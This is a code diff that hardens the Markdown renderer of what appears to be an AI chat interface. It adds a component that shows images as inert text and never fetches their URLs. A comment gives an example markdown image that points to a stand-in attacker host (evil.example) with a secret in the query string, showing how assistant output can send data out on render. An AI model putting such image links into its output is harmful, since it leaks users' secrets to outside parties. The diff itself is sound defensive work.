@@ -24,6 +24,21 @@ function SafeAnchor({ href, children }: ComponentPropsWithoutRef<'a'>) {
   );
 }
 
+// Markdown images are an attacker-influenceable network fetch: assistant output can embed
+// `![x](https://evil.example/track?leak=SECRET)` to exfiltrate data the moment the message
+// renders (React itself eagerly preloads `<img src>` via a speculative `<link rel="preload">`,
+// so even "never visible" framing does not help). No src ever reaches the DOM; only the alt
+// text (or, failing that, the raw URL) renders as inert text, mirroring SafeAnchor above.
+function SafeImage({ alt, src }: ComponentPropsWithoutRef<'img'>) {
+  const label =
+    typeof alt === 'string' && alt.length > 0 ? alt : typeof src === 'string' ? src : '画像';
+  return (
+    <span className="md-image-plain" title={typeof src === 'string' ? src : undefined}>
+      {label}
+    </span>
+  );
+}
+
 function PreBlock({ children, ...rest }: ComponentPropsWithoutRef<'pre'>) {
   const preRef = useRef<HTMLPreElement>(null);
   const [copied, setCopied] = useState(false);
@@ -52,7 +67,7 @@ function PreBlock({ children, ...rest }: ComponentPropsWithoutRef<'pre'>) {
   );
 }
 
-const COMPONENTS = { a: SafeAnchor, pre: PreBlock };
+const COMPONENTS = { a: SafeAnchor, pre: PreBlock, img: SafeImage };
 
 export function Markdown({ content }: { content: string }) {
   return (
